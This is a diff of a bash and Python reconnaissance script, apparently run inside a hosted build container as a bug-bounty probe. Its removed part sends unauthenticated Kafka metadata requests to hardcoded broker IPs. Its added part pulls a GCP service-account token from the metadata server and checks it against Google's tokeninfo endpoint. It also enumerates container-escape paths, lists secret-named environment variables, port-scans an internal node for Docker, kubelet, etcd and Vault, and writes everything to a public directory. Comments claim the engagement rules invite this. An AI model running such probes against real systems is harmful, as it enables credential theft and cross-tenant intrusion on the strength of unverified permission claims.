@@ -1,105 +1,87 @@
 #!/usr/bin/env bash
-# H1 build-container recon v6 — final build-container probe: control-plane reach (Kafka + OTLP).
-# v5 mapped the active TCP connections (uid=0 build-agent -> Kafka brokers :9092 + OTLP gateway :4317).
-# RoE explicitly INVITES reaching the orchestration control plane from the build. This probe tests
-# whether the Kafka brokers accept an UNAUTHENTICATED Metadata request (=> cross-tenant build-event
-# read possible) or require SASL (=> closed). METADATA-ONLY: we list brokers/topics to prove access;
-# we do NOT consume message payloads (could contain other tenants' data — out of minimum-proof scope).
-# Also re-captures /proc/net/tcp (decoder FIXED vs v5 double-reverse bug) for current control-plane IPs.
-# Read-only, RoE-clean, low-and-slow. Researcher: abedalaziz123sayed. No secret values exfiled.
+# H1 build-container recon v7 — the untested invited targets: GCP metadata (orchestration/SA token),
+# container-escape primitives (caps/docker.sock/k8s-sa/suid/mounts), and node internal port-scan.
+# RoE explicitly INVITES: root priv-esc, secrets NOT accessible to my user, container escape, orchestration plane.
+# STRICT HYGIENE: read-only, minimum-proof. A live GCP/K8s token is NEVER written to the public output —
+# only its length + sha256[:16] + token_type + expires_in + SCOPES (scopes prove impact w/o exposing the cred).
+# Researcher: abedalaziz123sayed. Low-and-slow. No cross-tenant data consumed.
 set +e
-PUB="public/recon6.txt"; mkdir -p public; : > "$PUB"
+PUB="public/recon7.txt"; mkdir -p public; : > "$PUB"
 p(){ echo "$*" >> "$PUB"; }
-UA="abedalaziz123sayed-h1-research"
-p "=====RECON6 START====="
+p "=====RECON7 START====="
 p "id=$(id)  node=$HOST_NODE_IP  ip=$(hostname -I 2>/dev/null)"
 
-# 1) re-capture active TCP connections (CORRECT decode) -> control-plane IPs (kafka 9092, otlp 4317, etc)
+# ---------- 1) GCP metadata server (THE orchestration/secret escalation) ----------
+p ""
+p "## GCP metadata reachability (metadata.google.internal / 169.254.169.254):"
+for HOST in metadata.google.internal 169.254.169.254; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' -m4 -H "Metadata-Flavor: Google" "http://$HOST/computeMetadata/v1/" 2>/dev/null)
+  p "  $HOST/computeMetadata/v1/ -> HTTP $code"
+done
+p "  project-id: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id 2>/dev/null | head -c120)"
+p "  numeric-project-id: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id 2>/dev/null | head -c60)"
+p "  instance/zone: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/zone 2>/dev/null | head -c120)"
+p "  instance/name: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/name 2>/dev/null | head -c80)"
+p "  SA list: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>/dev/null | tr '\n' ',' | head -c200)"
+p "  default SA email: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email 2>/dev/null | head -c120)"
+p "  default SA scopes: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes 2>/dev/null | tr '\n' ',' | head -c400)"
+# token: PROVE acquisition WITHOUT exposing the live credential
 python3 - <<'PY' >> "$PUB"
-import struct,socket
-st={1:'EST',2:'SYN',6:'TWAIT',8:'CLOSEW',9:'LASTACK',10:'LISTEN'}
-def dec(a):
-    try:
-        h,pt=a.split(':'); b=struct.pack('<I',int(h,16))
-        return f'{b[0]}.{b[1]}.{b[2]}.{b[3]}:{int(pt,16)}'
-    except: return '?:'+a
-kafka=set(); otlp=set(); intern=set()
-print("## /proc/net/tcp (correct decode):")
+import urllib.request, json, hashlib
 try:
-    for ln in open('/proc/net/tcp').read().splitlines()[1:]:
-        f=ln.split(); lip=dec(f[1]); rip=dec(f[2]); state=st.get(int(f[3],16),f[3]); uid=f[7]
-        print(f"  {lip} -> {rip} state={state} uid={uid}")
-        rhost,rport=rip.split(':')
-        if rport=='9092' and state=='EST': kafka.add(rhost)
-        if rport=='4317': otlp.add(rhost)
-        if rhost.startswith('172.16.') or rhost.startswith('10.') or rhost.startswith('192.168.'): intern.add(rip)
-except Exception as e: print("  tcp_err",e)
-print("KAFKA_BROKERS_EST="+",".join(sorted(kafka)))
-print("OTLP_ENDPOINTS="+",".join(sorted(otlp)))
-print("INTERNAL_REMOTES="+",".join(sorted(intern)))
+    req=urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                               headers={"Metadata-Flavor":"Google"})
+    r=urllib.request.urlopen(req, timeout=4); d=json.load(r)
+    tok=d.get("access_token","")
+    print("  SA TOKEN OBTAINED: len=%d sha256[:16]=%s type=%s expires_in=%s" % (
+        len(tok), hashlib.sha256(tok.encode()).hexdigest()[:16], d.get("token_type"), d.get("expires_in")))
+    # prove the token is USABLE (impact) by calling tokeninfo — returns scopes+email, NOT secret data
+    import urllib.parse
+    ti=urllib.request.urlopen("https://www.googleapis.com/oauth2/v1/tokeninfo?access_token="+urllib.parse.quote(tok), timeout=5)
+    tj=json.load(ti)
+    print("  TOKENINFO: scope=%s email=%s aud=%s expires_in=%s" % (tj.get("scope"), tj.get("email"), tj.get("audience"), tj.get("expires_in")))
+except Exception as e:
+    print("  SA TOKEN: FAIL %r" % (str(e)[:160],))
 PY
 
-# 2) Kafka unauth Metadata probe (api_key=3, v1, empty topic array = all topics). Metadata-only.
+# ---------- 2) container-escape primitives ----------
+p ""
+p "## container-escape primitives:"
+p "  caps(self): $(grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status 2>/dev/null | tr '\n' ' ')"
+p "  /proc/1/cgroup: $(cat /proc/1/cgroup 2>/dev/null | tr '\n' '|' | head -c240)"
+p "  docker.sock: $(ls -la /var/run/docker.sock 2>&1 | head -c120)"
+p "  containerd.sock: $(ls -la /run/containerd/containerd.sock 2>&1 | head -c120)"
+p "  k8s SA token dir: $(ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | tr '\n' ',' | head -c240)"
+p "  /run/secrets: $(ls -la /run/secrets/ 2>&1 | tr '\n' ',' | head -c200)"
+p "  suid binaries: $(find / -perm -4000 -type f 2>/dev/null | head -20 | tr '\n' ',')"
+p "  sudo -n: $(sudo -n true 2>&1 | head -c80; echo " rc=$?")"
+p "  writable root paths(sample): $(find /etc /usr/local/bin -writable -type f 2>/dev/null | head -8 | tr '\n' ',')"
+p "  mounts(sensitive): $(mount 2>/dev/null | grep -iE 'secret|docker|/proc/|/sys/fs' | head -8 | tr '\n' '|' | head -c300)"
+p "  env(NON-secret keys only): $(env 2>/dev/null | cut -d= -f1 | grep -iE 'NETLIFY|AWS|GCP|GOOGLE|K8S|KUBE|TOKEN|SECRET|VAULT|CONSUL|NOMAD' | tr '\n' ',' | head -c300)"
+
+# ---------- 3) node internal port-scan (172.16.7.1) — orchestration services ----------
+p ""
+p "## node 172.16.7.1 internal port-scan (orchestration surface):"
 python3 - <<'PY' >> "$PUB"
-import struct,socket,time
-brokers=["104.198.169.196","104.154.167.74","104.198.169.196","104.154.167.74"]
-# also try to read fresh brokers from our own /proc capture? they're in public/recon6.txt already;
-# hardcode the two known + retry.
-def meta_req():
-    p=struct.pack('>hh',3,1)+struct.pack('>i',1)+struct.pack('>h',-1)+struct.pack('>i',0)
-    return struct.pack('>i',len(p))+p
-def parse_topics(resp):
-    # resp = int32 len + payload. payload: int32 broker_count, [broker: nodeid(i32), host(str), port(i32)], int32 topic_count, [topic: err(i16), name(str), int32 part_count, [part: err(i16), leader(i32), replicas(i32 arr), isr(i32 arr)]]
+import socket
+node="172.16.7.1"
+ports={22:"ssh",80:"http",443:"https",2375:"docker",2376:"docker-tls",6443:"k8s-api",8443:"k8s-alt",
+10250:"kubelet",10255:"kubelet-ro",2379:"etcd",8500:"consul",4646:"nomad",8200:"vault",
+9092:"kafka",4317:"otlp",8080:"http-alt",9090:"prom",50051:"grpc",3000:"grafana",6379:"redis"}
+for pt,nm in sorted(ports.items()):
+    s=socket.socket(); s.settimeout(2)
     try:
-        off=0; ln=struct.unpack('>i',resp[off:off+4])[0]; off+=4
-        body=resp[off:off+ln]
-        o=0
-        bc=struct.unpack('>i',body[o:o+4])[0]; o+=4
-        for _ in range(bc):
-            o+=4  # nodeid
-            sl=struct.unpack('>h',body[o:o+2])[0]; o+=2; o+=sl+4  # host str + port
-        tc=struct.unpack('>i',body[o:o+4])[0]; o+=4
-        topics=[]
-        for _ in range(tc):
-            err=struct.unpack('>h',body[o:o+2])[0]; o+=2
-            sl=struct.unpack('>h',body[o:o+2])[0]; o+=2
-            nm=body[o:o+sl].decode('utf-8','replace'); o+=sl
-            topics.append((err,nm))
-            pc=struct.unpack('>i',body[o:o+4])[0]; o+=4
-            for _ in range(pc):
-                o+=2  # part err
-                o+=4  # leader
-                rc=struct.unpack('>i',body[o:o+4])[0]; o+=4; o+=rc*4
-                ic=struct.unpack('>i',body[o:o+4])[0]; o+=4; o+=ic*4
-        return topics
-    except Exception as e: return f"PARSE_ERR:{e}"
-print("## kafka unauth metadata probe (metadata-only, no message consume):")
-for bk in ["104.198.169.196","104.154.167.74"]:
-    try:
-        s=socket.socket(); s.settimeout(5); s.connect((bk,9092))
-        s.sendall(meta_req())
-        data=s.recv(65536); s.close()
-        if len(data)<8:
-            print(f"  {bk}:9092 -> recv {len(data)}b (likely SASL-required or closed)")
-        else:
-            t=parse_topics(data)
-            if isinstance(t,str): print(f"  {bk}:9092 -> resp {len(data)}b {t}")
-            else:
-                print(f"  {bk}:9092 -> UNAUTH METADATA OK, {len(t)} topics (showing first 15):")
-                for err,nm in t[:15]:
-                    print(f"     err={err} topic={nm}")
-                if len(t)>15: print(f"     ... +{len(t)-15} more")
-    except Exception as e:
-        print(f"  {bk}:9092 -> CONNECT_FAIL: {e}")
+        s.connect((node,pt)); print(f"  {node}:{pt} ({nm}) OPEN"); s.close()
+    except Exception:
+        pass
+print("  (only OPEN ports listed)")
 PY
 
-# 3) OTLP gateway inbound probe (172.16.7.1:4317) — is it reachable/responds from buildbot?
-p "## otlp gateway 172.16.7.1:4317 inbound:"
-p "  http_get=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://172.16.7.1:4317/ 2>/dev/null)"
-p "  tcp_connect=$(python3 -c "import socket;s=socket.socket();s.settimeout(3);
-try:
- s.connect(('172.16.7.1',4317));print('open')
-except Exception as e:print('fail:'+str(e)[:60])" 2>&1)"
+# ---------- 4) kubelet read-only API if reachable (10255) — pod list = cross-tenant ----------
+p ""
+p "## kubelet/k8s api quick probe:"
+p "  10255/pods: $(curl -s -o /dev/null -w '%{http_code}' -m3 http://172.16.7.1:10255/pods 2>/dev/null)"
+p "  10250/pods(https): $(curl -sk -o /dev/null -w '%{http_code}' -m3 https://172.16.7.1:10250/pods 2>/dev/null)"
 
-p "=====RECON6 END====="
+p "=====RECON7 END====="
 cat "$PUB"
